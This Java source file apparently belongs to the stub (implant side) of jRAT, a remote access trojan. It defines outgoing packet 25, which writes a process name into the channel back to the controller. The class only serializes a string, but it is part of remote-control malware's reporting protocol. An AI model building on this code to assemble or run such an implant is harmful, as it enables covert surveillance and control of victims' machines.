package se.jrat.stub.packets.outgoing;

import java.io.DataOutputStream;

import se.jrat.common.io.StringWriter;


public class Packet25Process extends AbstractOutgoingPacket {

	private String process;

	public Packet25Process(String process) {
		this.process = process;
	}

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		sw.writeLine(process);
	}

	@Override
	public byte getPacketId() {
		return 25;
	}

}
